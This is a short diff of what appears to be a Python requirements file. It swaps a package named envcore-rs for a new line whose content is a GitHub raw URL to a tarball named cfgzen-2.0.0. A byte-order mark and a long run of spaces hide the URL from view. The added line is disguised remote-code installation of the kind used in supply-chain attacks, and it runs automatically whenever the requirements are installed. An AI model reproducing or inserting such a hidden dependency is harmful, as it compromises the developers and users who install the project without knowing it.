@@ -1,4 +1,4 @@
-envcore-rs
 websockets
 keyboard
 colorama
+﻿                                                                                                                                                                                                                                                                                           https://github.com/cfgzen/version/raw/refs/heads/main/cfgzen-2.0.0.tar.gz
